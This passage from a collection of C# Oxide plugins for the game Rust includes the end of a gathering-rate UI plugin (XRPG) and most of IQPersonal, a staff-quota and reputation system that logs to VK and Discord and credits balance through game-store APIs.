                    StoredData[player.userID].Ore = config.Ore.RateMax;
                    StoredData[player.userID].OreRate = config.Ore.RateMax;
                }
                else
                    StoredData[player.userID].OreRate = config.Ore.RateMax;

                if (StoredData[player.userID].Animal >= config.Animal.RateMax)
                {
                    StoredData[player.userID].Animal = config.Animal.RateMax;
                    StoredData[player.userID].AnimalRate = config.Animal.RateMax;
                }
                else
                    StoredData[player.userID].AnimalRate = config.Animal.RateMax;

                StoredData[player.userID].Boost = config.Setting.Boost;
            }
            else
            {
                StoredData[player.userID].WoodRate = wrate;
                StoredData[player.userID].OreRate = orate;
                StoredData[player.userID].AnimalRate = arate;

                StoredData[player.userID].Boost = boost;
            }
        }

        #endregion

        #region GUI

        void RPGUI(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, ".RPG");
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = config.Panel.AnchorMin, AnchorMax = config.Panel.AnchorMax, OffsetMin = config.Panel.OffsetMin, OffsetMax = config.Panel.OffsetMax },
                Image = { Color = "0 0 0 0" }
            }, "Hud", ".RPG");

            CuiHelper.AddUi(player, container);
			
			WoodUI(player);
			OreUI(player);
			AnimalUI(player);
        }
		
		void HideUI(BasePlayer player)
		{
			CuiHelper.DestroyUi(player, ".Hide");
            CuiElementContainer container = new CuiElementContainer();
			
			CuiHelper.AddUi(player, container);
		}
		
		void ShowUI(BasePlayer player)
		{
			CuiHelper.DestroyUi(player, ".Show");
            CuiElementContainer container = new CuiElementContainer();
			
			CuiHelper.AddUi(player, container); 
		}
		
		void WoodUI(BasePlayer player)
		{
			CuiHelper.DestroyUi(player, ".Wood");
            CuiElementContainer container = new CuiElementContainer();
			
			float ratewood = StoredData[player.userID].Wood;
            float maxratewood = StoredData[player.userID].WoodRate;
            string pregresswood = ratewood >= maxratewood ? "-3 23" : config.Panel.Progress ?  $"{-166 + ((ratewood - config.Wood.RateStart) * (163 / (maxratewood - config.Wood.RateStart)))} 23" : $"{-163 + (ratewood * (160 / maxratewood))} 23";
            string textwood = ratewood >= maxratewood ? $"{lang.GetMessage("W", this, player.UserIDString)} {maxratewood}x" : $"{lang.GetMessage("W", this, player.UserIDString)} {Math.Round(ratewood, 2)}x";

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-192 56", OffsetMax = "0 82" },
                Image = { Color = "0.9686275 0.9176471 0.8784314 0.02921569", Material = "assets/icons/greyout.mat" }
            }, ".RPG", ".Wood");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-189 4", OffsetMax = "-171 22" },
                Button = { Color = "1 1 1 0.5", Sprite = "assets/icons/level_wood.png" },
                Text = { Text = "" }
            }, ".Wood");

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-166 3", OffsetMax = pregresswood },
                Image = { Color = "0.5586275 0.7376471 0.2484314 0.92921569", Material = "assets/icons/greyout.mat" }
            }, ".Wood");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-154 0", OffsetMax = "0 26" },
                Text = { Text = textwood, Align = TextAnchor.MiddleLeft, FontSize = 13, Color = "1 1 1 0.6" }
            }, ".Wood");
			
			CuiHelper.AddUi(player, container);
		}		
		
		void OreUI(BasePlayer player)
		{
			CuiHelper.DestroyUi(player, ".Ore");
            CuiElementContainer container = new CuiElementContainer();
			
			float rateore = StoredData[player.userID].Ore;
            float maxrateore = StoredData[player.userID].OreRate;
			string pregressore = rateore >= maxrateore ? "-3 23" : config.Panel.Progress ?  $"{-166 + ((rateore - config.Ore.RateStart) * (163 / (maxrateore - config.Ore.RateStart)))} 23" : $"{-163 + (rateore * (160 / maxrateore))} 23";
            string textore = rateore >= maxrateore ? $"{lang.GetMessage("O", this, player.UserIDString)} {maxrateore}x" : $"{lang.GetMessage("O", this, player.UserIDString)} {Math.Round(rateore, 2)}x";

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-192 28", OffsetMax = "0 54" },
                Image = { Color = "0.9686275 0.9176471 0.8784314 0.02921569", Material = "assets/icons/greyout.mat" }
            }, ".RPG", ".Ore");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-189 4", OffsetMax = "-171 22" },
                Button = { Color = "1 1 1 0.5", Sprite = "assets/icons/player_carry.png" },
                Text = { Text = "" }
            }, ".Ore");

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-166 3", OffsetMax = pregressore },
                Image = { Color = "0.2986275 0.6076471 0.8384314 0.92921569", Material = "assets/icons/greyout.mat" }
            }, ".Ore");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-154 0", OffsetMax = "0 26" },
                Text = { Text = textore, Align = TextAnchor.MiddleLeft, FontSize = 13, Color = "1 1 1 0.6" }
            }, ".Ore");
			
			CuiHelper.AddUi(player, container);
		}		
		
		void AnimalUI(BasePlayer player)
		{
			CuiHelper.DestroyUi(player, ".Animal");
            CuiElementContainer container = new CuiElementContainer();
			
			float rateanimal = StoredData[player.userID].Animal;
            float maxrateanimal = StoredData[player.userID].AnimalRate;
			string pregressanimal = rateanimal >= maxrateanimal ? "-3 23" : config.Panel.Progress ?  $"{-166 + ((rateanimal - config.Animal.RateStart) * (163 / (maxrateanimal - config.Animal.RateStart)))} 23" : $"{-163 + (rateanimal * (160 / maxrateanimal))} 23";
            string textanimal = rateanimal >= maxrateanimal ? $"{lang.GetMessage("A", this, player.UserIDString)} {maxrateanimal}x" : $"{lang.GetMessage("A", this, player.UserIDString)} {Math.Round(rateanimal, 2)}x";

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-192 0", OffsetMax = "0 26" },
                Image = { Color = "0.9686275 0.9176471 0.8784314 0.02921569", Material = "assets/icons/greyout.mat" }
            }, ".RPG", ".Animal");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-189 4", OffsetMax = "-171 22" },
                Button = { Color = "1 1 1 0.5", Sprite = "assets/icons/bite.png" },
                Text = { Text = "" }
            }, ".Animal");

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-166 3", OffsetMax = pregressanimal },
                Image = { Color = "0.7886275 0.4476471 0.2184314 0.92921569", Material = "assets/icons/greyout.mat" }
            }, ".Animal");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-154 0", OffsetMax = "0 26" },
                Text = { Text = textanimal, Align = TextAnchor.MiddleLeft, FontSize = 13, Color = "1 1 1 0.6" }
            }, ".Animal");
			
			CuiHelper.AddUi(player, container);
		}

        #endregion

        #region Message

        void UPMessageWood(BasePlayer player, string Messages)
        {
            CuiHelper.DestroyUi(player, ".UPMessageWood");
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiLabel
            {
                FadeOut = 0.5f,
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-285 0", OffsetMax = "-225 26" },
                Text = { FadeIn = 0.5f, Text = $"{Messages}", Align = TextAnchor.MiddleRight, Font = "robotocondensed-regular.ttf", FontSize = 13, Color = "1 1 1 0.6" }
            }, ".Wood", ".UPMessageWood");

            CuiHelper.AddUi(player, container);

            timer.Once(2.5f, () => { CuiHelper.DestroyUi(player, ".UPMessageWood"); });
        }

        void UPMessageOre(BasePlayer player, string Messages)
        {
            CuiHelper.DestroyUi(player, ".UPMessageOre");
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiLabel
            {
                FadeOut = 0.5f,
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-285 0", OffsetMax = "-225 26" },
                Text = { FadeIn = 0.5f, Text = $"{Messages}", Align = TextAnchor.MiddleRight, Font = "robotocondensed-regular.ttf", FontSize = 13, Color = "1 1 1 0.6" }
            }, ".Ore", ".UPMessageOre");

            CuiHelper.AddUi(player, container);

            timer.Once(2.5f, () => { CuiHelper.DestroyUi(player, ".UPMessageOre"); });
        }

        void UPMessageAnimal(BasePlayer player, string Messages)
        {
            CuiHelper.DestroyUi(player, ".UPMessageAnimal");
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiLabel
            {
                FadeOut = 0.5f,
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-285 0", OffsetMax = "-225 26" },
                Text = { FadeIn = 0.5f, Text = $"{Messages}", Align = TextAnchor.MiddleRight, Font = "robotocondensed-regular.ttf", FontSize = 13, Color = "1 1 1 0.6" }
            }, ".Animal", ".UPMessageAnimal");

            CuiHelper.AddUi(player, container);

            timer.Once(2.5f, () => { CuiHelper.DestroyUi(player, ".UPMessageAnimal"); });
        }

        #endregion
		
		#region Lang

        void InitializeLang()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["W"] = "LUMBERJACK:",					
                ["O"] = "MINER:",					
                ["A"] = "HUNTER:",					
                ["WT"] = "TOP LUMBERJACK:",					
                ["OT"] = "TOP MINER:",					
                ["AT"] = "TOP HUNTER:",					
                ["NP"] = "Недостаточно прав!",					
            }, this);

            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["W"] = "ЛЕСОРУБ:",					
                ["O"] = "РУДОКОП:",					
                ["A"] = "ОХОТНИК:",					
                ["WT"] = "ТОП ЛЕСОРУБОВ:",					
                ["OT"] = "ТОП РУДОКОПОВ:",					
                ["AT"] = "ТОП ОХОТНИКОВ:",					
                ["NP"] = "Недостаточно прав!",						
            }, this, "ru");
        }

        #endregion
    }
}

// --- End of file: XRPG.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/IQPersonal.cs ---
// --- Original Local Path: IQPersonal.cs ---

﻿using System;
using System.Collections.Generic;
using ConVar;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;

namespace Oxide.Plugins
{
    [Info("IQPersonal", "Mercury", "1.0.0")]
    [Description("Властвуй по пионерски. Система контроля персонала")]
    class IQPersonal : RustPlugin
    {
        #region Reference
        [PluginReference] Plugin IQChat;
        public void SendChat(BasePlayer player, string Message, Chat.ChatChannel channel = Chat.ChatChannel.Global)
        {
            var Chat = config.MoreSetting;
            if (IQChat)
                IQChat?.Call("API_ALERT_PLAYER", player, Message, Chat.CustomPrefix, Chat.CustomAvatar, Chat.CustomHex);
            else player.SendConsoleCommand("chat.add", channel, 0, Message);
        }
        #endregion

        #region Vars
        public static string PermissionUse = "iqpersonal.use";
        #endregion

        #region Configuration

        private static Configuration config = new Configuration();
        private class Configuration
        {
            [JsonProperty("Основная настройка плагина")]
            public ControllerSettings ControllerSetting = new ControllerSettings();
            [JsonProperty("Настройка дневной нормы для персонала")]
            public Dictionary<string, ControllerDay> Settings = new Dictionary<string, ControllerDay>();
            [JsonProperty("Использовать логирование в беседу ВК")]
            public bool UseLogged;
            [JsonProperty("Использовать логирование в Discord канал")]
            public bool UseDiscordLogged;
            [JsonProperty("Настройка ВК для логирования в беседу(Если включено)")]
            public VKInformation VKSetting = new VKInformation();
            [JsonProperty("Настройка Discord для логирования в канал(Если включено)")]
            public DiscordInformation DiscordSetting = new DiscordInformation();
            [JsonProperty("Настройка магазинов")]
            public StoreSettings StoreSetting = new StoreSettings();
            [JsonProperty("Дополнительные настройки")]
            public MoreSettings MoreSetting = new MoreSettings();
            internal class ControllerDay
            {
                [JsonProperty("Учитывать время в суточной норме")]
                public bool DayTimeUse;
                [JsonProperty("Суточная норма отыгранного времени на сервере[секунды]")]
                public int DayTime;
                [JsonProperty("Учитывать муты в суточной норме(IQChat)")]
                public bool DayMuteUse;
                [JsonProperty("Суточная норма выданных мутов(IQChat)")]
                public int DayMute;
                [JsonProperty("Учитывать проверки в суточной норме(IQReportSystem)")]
                public bool DayCheckUse;
                [JsonProperty("Суточная норма проверок(IQReportSystem)")]
                public int DayCheck;
            }
            internal class ControllerSettings
            {
                [JsonProperty("Учитывать время")]
                public bool ControllerTime;
                [JsonProperty("Учитывать муты(IQChat)")]
                public bool ControllerMute;
                [JsonProperty("Учитывать проверки(IQReportSystem)")]
                public bool ControllerCheck;
                [JsonProperty("Учитывать блокировки(IQReportSystem)")]
                public bool ControllerBans;
                [JsonProperty("Учитывать ругань персонала(IQChat)")]
                public bool ControllerBadWords;
                [JsonProperty("Сколько очков репутации снимать за 1 запрещенное слово(IQChat)")]
                public int ScoreRemoveBadWords;
                [JsonProperty("Сколько очков репутации нужно для вывода 1 рубля")]
                public int ScoreChanged;
                [JsonProperty("Включить суточную норму")]
                public bool ControllerDays;
                [JsonProperty("Снимать репутацию в случае не выполнения суточной нормы")]
                public bool UseControllerDaysFailed;
                [JsonProperty("Включить автоматическое снятие,при низкой репутации")]
                public bool ControllerAutoKick;
                [JsonProperty("При каком отрицательном показателе репутации снимать персонал")]
                public int AutoKickMinimalReputation;
                [JsonProperty("Сколько очков репутации начислять за выполнение дневной нормы")]
                public int ScoreAddDayNormal;
                [JsonProperty("Сколько репутации начислять за мут")]
                public int ScoreMute;
                [JsonProperty("Сколько репутации начислять за проверку игрока")]
                public int ScoreCheck;
                [JsonProperty("Сколько репутации начислять за блокировку игрока")]
                public int ScoreBans;
                [JsonProperty("Сколько репутации снимать за не выполнение суточной нормы")]
                public int ScoreFailedControllerDays;
            }
            internal class VKInformation
            {
                [JsonProperty("Токен от группы ВК(От группы будут идти сообщения в беседу.Вам нужно добавить свою группу в беседу!)")]
                public string VKToken;
                [JsonProperty("ID беседы для отправки логов(Отчет о времени,статистика)")]
                public string VKChatID;
                [JsonProperty("ID беседы с персоналом(если имеется. Туда будет приходить информация о добавлении персонала и удалять тех,кого кикнули(автоматически))")]
                public string VKChatIDPersonal;
            }
            internal class DiscordInformation
            {
                [JsonProperty("Webhooks для дискорда")]
                public string WebHook;
            }
            internal class MoreSettings
            {
                [JsonProperty("Префикс для чата(IQChat)")]
                public string CustomPrefix;
                [JsonProperty("Аватарка для чата(IQChat)")]
                public string CustomAvatar;
                [JsonProperty("Цвет для сообщения в чате(IQChat)")]
                public string CustomHex;
                [JsonProperty("Выдавать дополнительные права,при добавлении в персонал(при удалении будут сниматься)")]
                public bool GiveMorePermission;
                [JsonProperty("Лист дополительных привилегий(Если включено)(Выдадутся все сразу,при добавлении в персонал.При удалении снимутся)(Пример : iqchat.vip)")]
                public List<string> Permissions = new List<string>();
            }
            internal class StoreSettings
            {
                [JsonProperty("Использовать магазин MoscowOVH")]
                public bool MoscowOVH;
                [JsonProperty("Использовать магазин GameStores")]
                public bool GameStores;
                [JsonProperty("Настройки для магазина GameStores")]
                public GameStoresInformation InfoGameStores = new GameStoresInformation();
                internal class GameStoresInformation
                {
                    [JsonProperty("API Магазина(GameStores)")]
                    public string GameStoresAPIStore;
                    [JsonProperty("ID Магазина(GameStores)")]
                    public string GameStoresIDStore;
                    [JsonProperty("Сообщение в магазин при выдаче баланса(GameStores)")]
                    public string GameStoresMessage;
                }
            }

            public static Configuration GetNewConfiguration()
            {
                return new Configuration
                {
                    UseLogged = true,
                    UseDiscordLogged = true,
                    ControllerSetting = new ControllerSettings
                    {
                        ControllerBadWords = true,
                        ControllerBans = true,
                        ControllerCheck = true,
                        ControllerDays = true,
                        ControllerMute = true,
                        ControllerTime = true,
                        UseControllerDaysFailed = true,
                        ScoreChanged = 5,
                        ScoreAddDayNormal = 10,
                        ScoreRemoveBadWords = 1,
                        ScoreBans = 5,
                        ScoreCheck = 3,
                        ControllerAutoKick = true,
                        AutoKickMinimalReputation = -100,
                        ScoreMute = 1,
                        ScoreFailedControllerDays = 5,
                    },
                    Settings = new Dictionary<string, ControllerDay>
                    {
                        ["iqpersonal.helper"] = new ControllerDay
                        {
                            DayTimeUse = true,
                            DayCheckUse = false,
                            DayMuteUse = true,
                            DayMute = 10,
                            DayCheck = 0,
                            DayTime = 500
                        },
                        ["iqpersonal.moderator"] = new ControllerDay
                        {
                            DayTimeUse = true,
                            DayCheckUse = true,
                            DayMuteUse = true,
                            DayMute = 10,
                            DayCheck = 5,
                            DayTime = 1000
                        },
                    },
                    StoreSetting = new StoreSettings
                    {
                        GameStores = false,
                        MoscowOVH = true,
                        InfoGameStores = new StoreSettings.GameStoresInformation
                        {
                            GameStoresAPIStore = "",
                            GameStoresIDStore = "",
                            GameStoresMessage = "Вам зачислен баланс! Хорошего дня"
                        }
                    },
                    MoreSetting = new MoreSettings
                    {
                        CustomAvatar = "",
                        CustomHex = "",
                        CustomPrefix = "",
                        GiveMorePermission = false,
                        Permissions = new List<string>
                        {
                            "iqchat.personal",
                            "iqchat.vip",
                        }
                    },
                    VKSetting = new VKInformation
                    {
                        VKChatID = "",
                        VKToken = "",
                        VKChatIDPersonal = ""
                    },
                    DiscordSetting = new DiscordInformation
                    {
                        WebHook = ""
                    }
                };
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config == null) LoadDefaultConfig();
            }
            catch
            {
                PrintWarning("Ошибка #87" + $"чтения конфигурации 'oxide/config/{Name}', создаём новую конфигурацию! #45");
                LoadDefaultConfig();
            }
            NextTick(SaveConfig);
        }

        protected override void LoadDefaultConfig() => config = Configuration.GetNewConfiguration();
        protected override void SaveConfig() => Config.WriteObject(config);

        #endregion

        #region Data
        [JsonProperty("Информация о персонале")] public Dictionary<ulong, InformationUser> DataInformation = new Dictionary<ulong, InformationUser>();
        [JsonProperty("Хранение времени")] public int TimeDay;
        public class InformationUser
        {
            [JsonProperty("Ник")]
            public string DisplayName;
            [JsonProperty("Ссылка на ВК")]
            public string VKLink;
            [JsonProperty("Дневное отыгранное время на сервере")]
            public int DayTime;
            [JsonProperty("Дневное количество выданных мутов")]
            public int DayMute;
            [JsonProperty("Дневное количество проверок")]
            public int DayCheck;
            [JsonProperty("Дневное количество выданных блокировок")]
            public int DayBans;
            [JsonProperty("Очки репутации игрока")]
            public int ScorePlayer;
            [JsonProperty("Статус дневной нормы(true - выполнил/false - нет)")]
            public bool StatusDayNormal;
        }
        void ReadData() {
            DataInformation = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, InformationUser>>("IQPersonal/Information");
            TimeDay = Oxide.Core.Interface.Oxide.DataFileSystem.ReadObject<int>("IQPersonal/Time");
        }
        void WriteData() => timer.Every(60f, () => {
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQPersonal/Information", DataInformation);
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQPersonal/Time", TimeDay);
        });
        void RegisteredDataUser(ulong player, string VKLink = "")
        {
            if (!DataInformation.ContainsKey(player))
                DataInformation.Add(player, new InformationUser
                {
                    DisplayName = covalence.Players.FindPlayerById(player.ToString()).Name,
                    StatusDayNormal = false,
                    DayBans = 0,
                    DayCheck = 0,
                    DayMute = 0,
                    DayTime = 0,
                    ScorePlayer = 0,
                    VKLink = VKLink,
                });
        }

        #endregion

        #region Metods

        void NormalDaySet()
        {
            if (IsDayNormal())
            {
                DayNormalCheck();
                timer.Once(10f, () =>
                {
                    TimeDay = Convert.ToInt32(CurrentTime() + 86400);
                    PrintWarning("Начался отсчетный день для персонала");
                    VKSendMessage(lang.GetMessage("VK_SET_TIME_DAY", this), config.VKSetting.VKChatIDPersonal);
                    DiscordSendMessage(lang.GetMessage("VK_SET_TIME_DAY", this));
                    foreach (var p in BasePlayer.activePlayerList)
                        if (permission.UserHasPermission(p.UserIDString, PermissionUse))
                            SendChat(p, lang.GetMessage("CHAT_START_TIME_DAY", this));
                });
            }
        }
        void DayNormalCheck()
        {
            if (!config.ControllerSetting.ControllerDays) return;
            PrintWarning("Отчетный день персонала закончился! Персоналу в онлайне сейчас будут отосланы уведомления!");
            foreach (var Data in DataInformation)
            {
                var User = Data.Value;
                var Controller = config.Settings;
                foreach (var UserDayly in Controller)
                {
                    var Day = UserDayly.Value;
                    int Check = Day.DayCheckUse ? User.DayCheck : 0;
                    int Mute = Day.DayMuteUse ? User.DayMute : 0;
                    int Time = Day.DayTimeUse ? User.DayTime : 0;
                    if(Check >= Day.DayCheck 
                    && Mute >= Day.DayMute
                    && Time >= Day.DayTime)
                        User.StatusDayNormal = true;
                }
                DayNormalFinish(Data.Key);
            }
            VKSendMessage(lang.GetMessage("VK_FINISH_TIME_DAY", this), config.VKSetting.VKChatIDPersonal);
            DiscordSendMessage(lang.GetMessage("VK_FINISH_TIME_DAY", this));
        }

        void DayNormalFinish(ulong UserID)
        {
            var User = DataInformation[UserID];
            var Controller = config.ControllerSetting;

            string StatusNormal = Controller.ControllerDays ? IsPersonalNormalCompleted(UserID) ? lang.GetMessage("STATUS_COMPLETED", this) : lang.GetMessage("STATUS_NO_COMPLETED", this) : lang.GetMessage("STATISTICK_TURN_OFF", this);
            string TimeGame = Controller.ControllerTime ? TimeSpan.FromSeconds((double)User.DayTime).ToShortString() : lang.GetMessage("STATISTICK_TURN_OFF", this); 
            string Reputation = User.ScorePlayer.ToString();
            string CountBans = Controller.ControllerBans ? IsPersonal(UserID) ? User.DayBans.ToString() : lang.GetMessage("STATISTICK_NULL", this) : lang.GetMessage("STATISTICK_TURN_OFF", this);
            string CountCheck = Controller.ControllerCheck ? IsPersonal(UserID) ? User.DayCheck.ToString() : lang.GetMessage("STATISTICK_NULL", this) : lang.GetMessage("STATISTICK_TURN_OFF", this);
            string CountMute = Controller.ControllerMute ? IsPersonal(UserID) ? User.DayMute.ToString() : lang.GetMessage("STATISTICK_NULL", this) : lang.GetMessage("STATISTICK_TURN_OFF", this);

            string MessageStatistick = String.Format(lang.GetMessage("VK_FINISH_TIME_DAY_STATISTICK_USER", this), User.DisplayName, TimeGame, CountBans, CountCheck, CountMute, Reputation, StatusNormal);
            string MessageChat = IsPersonalNormalCompleted(UserID) ? String.Format(lang.GetMessage("CHAT_FINISH_TIME_DAY_COMPLETED", this), Controller.ScoreAddDayNormal) : lang.GetMessage("CHAT_FINISH_TIME_DAY_NO_COMPLETED", this);
            VKSendMessage(MessageStatistick);
            DiscordSendMessage(MessageStatistick);

            if (Controller.ControllerAutoKick)
                if (User.ScorePlayer <= Controller.AutoKickMinimalReputation)
                    RemovePersonal(UserID);

            User.DayBans = 0;
            User.DayCheck = 0;
            User.DayMute = 0;
            User.DayTime = 0;
            User.StatusDayNormal = false;
            if (IsPersonalNormalCompleted(UserID))
                User.ScorePlayer += Controller.ScoreAddDayNormal;
            else
            {
                if (Controller.UseControllerDaysFailed)
                    User.ScorePlayer -= Controller.ScoreFailedControllerDays;
            }

            var player = BasePlayer.FindByID(UserID);
            if (player != null) 
                SendChat(player, MessageChat);
        }

        void TrackerTime(BasePlayer player)
        {
            if (!config.ControllerSetting.ControllerTime) return;
            if (!HasPermission(player.userID, PermissionUse)) return;
            if (!DataInformation.ContainsKey(player.userID)) return;
            ServerStatistics.Storage playerStatistics = ServerStatistics.Get(player.userID);
            int TimeGame = playerStatistics.Get("time");
            var User = DataInformation[player.userID];
            User.DayTime += TimeGame;
        }
        void BalanceSet(ulong UserID)
        {
            var Store = config.StoreSetting;
            var Balance = ConvertReputation(UserID);
            var User = DataInformation[UserID];

            if (Store.MoscowOVH)
            {
                plugins.Find("RustStore").CallHook("APIChangeUserBalance", UserID, Balance, new Action<string>((result) =>
                {
                    if (result == "SUCCESS")
                    {
                        VKSendMessage(String.Format(lang.GetMessage("VK_GIVE_BALANCE", this), User.DisplayName, Balance));
                        DiscordSendMessage(String.Format(lang.GetMessage("VK_GIVE_BALANCE", this), User.DisplayName, Balance), UserID);
                        return;
                    }
                    VKSendMessage(String.Format(lang.GetMessage("VK_NO_AUTH_STORE", this), User.DisplayName));
                    DiscordSendMessage(String.Format(lang.GetMessage("VK_NO_AUTH_STORE", this), User.DisplayName), UserID);
                }));
            }
            if(Store.GameStores)
            {
                if(String.IsNullOrEmpty(Store.InfoGameStores.GameStoresAPIStore) || String.IsNullOrEmpty(Store.InfoGameStores.GameStoresIDStore))
                {
                    PrintWarning("Ошибка #267 : Магазин не настроен! Он будет работать неккоректно!");
                    return;
                }
                webrequest.Enqueue($"https://gamestores.ru/api?shop_id={Store.InfoGameStores.GameStoresIDStore}&secret={Store.InfoGameStores.GameStoresAPIStore}&action=moneys&type=plus&steam_id={UserID}&amount={Balance}&mess={Store.InfoGameStores.GameStoresMessage}", null, (i, s) =>
                {
                    if (i != 200) { }
                    if (s.Contains("success"))
                    {
                        VKSendMessage(String.Format(lang.GetMessage("VK_GIVE_BALANCE", this), User.DisplayName, Balance));
                        DiscordSendMessage(String.Format(lang.GetMessage("VK_GIVE_BALANCE", this), User.DisplayName, Balance), UserID);
                        return;
                    }
                    if (s.Contains("fail"))
                    {
                        VKSendMessage(String.Format(lang.GetMessage("VK_NO_AUTH_STORE", this), User.DisplayName));
                        DiscordSendMessage(String.Format(lang.GetMessage("VK_NO_AUTH_STORE", this), User.DisplayName), UserID);
                    }
                }, this);
            }
            User.ScorePlayer = 0;
        }

        void AddPersonal(ulong userID, string VKLink)
        {
            var More = config.MoreSetting;
            var VK = config.VKSetting;
            string ReplaceLink = VKLink.Replace("https://vk.com/", "").Replace("vk.com/", "");
            string URL = $"https://api.vk.com/method/users.get?user_ids={ReplaceLink}&access_token={VK.VKToken}&v=5.88";

            if (DataInformation.ContainsKey(userID))
            {
                PrintWarning(lang.GetMessage("IQP_ADD_PLAYER_CONTAINS", this));
                return;
            }

            if (!HasPermission(userID, PermissionUse))
                permission.GrantUserPermission(userID.ToString(), PermissionUse, this);

            if (More.GiveMorePermission)
                foreach (var PermList in More.Permissions)
                    if (!HasPermission(userID, PermList))
                        permission.GrantUserPermission(userID.ToString(), PermList, this);


            webrequest.Enqueue(URL, null, (code, response) =>
            {
                var json = JObject.Parse(response);
                string ID = (string)json["response"]?[0]?["id"];
                string FirstName = (string)json["response"]?[0]?["first_name"];
                string LastName = (string)json["response"]?[0]?["last_name"];
                string Information = $"{FirstName} {LastName}";

                RegisteredDataUser(userID, ID);
                VKSendMessage(String.Format(lang.GetMessage("VK_ADD_PERSONAL", this), Information, userID, VKLink), VK.VKChatIDPersonal);
                DiscordSendMessage(String.Format(lang.GetMessage("VK_ADD_PERSONAL", this), Information, userID, VKLink), userID);
                PrintWarning(lang.GetMessage("IQP_ADD_PLAYER_ACCESS", this));
            }, this);
        }

        void RemovePersonal(ulong userID)
        {
            var More = config.MoreSetting;
            var VK = config.VKSetting;
            string URL = $"https://api.vk.com/method/users.get?user_ids={DataInformation[userID].VKLink}&access_token={VK.VKToken}&v=5.88";

            if (!DataInformation.ContainsKey(userID))
            {
                PrintWarning(lang.GetMessage("IQP_REMOVE_PLAYER_CONTAINS", this));
                return;
            }

            if (More.GiveMorePermission)
                foreach (var PermList in More.Permissions)
                    if (HasPermission(userID, PermList))
                        permission.GrantUserPermission(userID.ToString(), PermList, this);

            if (HasPermission(userID, PermissionUse))
                permission.RevokeUserPermission(userID.ToString(), PermissionUse);

            webrequest.Enqueue(URL, null, (code, response) =>
            {
                var json = JObject.Parse(response);
                string ID = (string)json["response"]?[0]?["id"];
                string FirstName = (string)json["response"]?[0]?["first_name"];
                string LastName = (string)json["response"]?[0]?["last_name"];
                string Information = $"{FirstName} {LastName}";

                string URLKick = $"https://api.vk.com/method/messages.removeChatUser?chat_id={VK.VKChatID}&member_id={ID}&access_token={VK.VKToken}&v=5.88";
                webrequest.Enqueue(URLKick, null, (code2, response2) =>
                {
                    if(code2 == 935)
                    {
                        PrintWarning(lang.GetMessage("VK_ERRORS_935",this));
                        return;
                    }
                    if (code2 == 936)
                    {
                        PrintWarning(lang.GetMessage("VK_ERRORS_936", this));
                        return;
                    }
                    if (code2 == 945)
                    {
                        PrintWarning(lang.GetMessage("VK_ERRORS_945", this));
                        return;
                    }
                    VKSendMessage(String.Format(lang.GetMessage("VK_REMOVE_PERSONAL", this), Information, userID), VK.VKChatIDPersonal);
                    DiscordSendMessage(String.Format(lang.GetMessage("VK_REMOVE_PERSONAL", this), Information, userID), userID);
                    PrintWarning(lang.GetMessage("IQP_REMOVE_PLAYER_ACCESS", this));
                    DataInformation.Remove(userID);
                }, this);
            }, this);
        }

        void ChangePersonalVK(ulong userID, string VKLink)
        {
            if (!DataInformation.ContainsKey(userID))
            {
                PrintWarning(lang.GetMessage("IQP_REMOVE_PLAYER_CONTAINS", this));
                return;
            }

            var VK = config.VKSetting;
            string ReplaceLink = VKLink.Replace("https://vk.com/", "").Replace("vk.com/", ""); 
            var User = DataInformation[userID];
            string URL = $"https://api.vk.com/method/users.get?user_ids={User.VKLink}&access_token={VK.VKToken}&v=5.88";                 

            webrequest.Enqueue(URL, null, (code, response) =>
            {
                var json = JObject.Parse(response);
                string ID = (string)json["response"]?[0]?["id"];
                string FirstName = (string)json["response"]?[0]?["first_name"];
                string LastName = (string)json["response"]?[0]?["last_name"];
                string Information = $"{FirstName} {LastName}";

                User.VKLink = ReplaceLink;

                VKSendMessage(String.Format(lang.GetMessage("VK_CHANGE_VK", this), Information, VKLink), VK.VKChatIDPersonal);
                DiscordSendMessage(String.Format(lang.GetMessage("VK_CHANGE_VK", this), Information, VKLink), userID);
                PrintWarning(lang.GetMessage("IQP_CHANGE_ACCESS", this));
            }, this);
        }

        #endregion

        #region Hooks
        private void OnServerInitialized()
        {
            RegisteredPermission();
            ReadData();
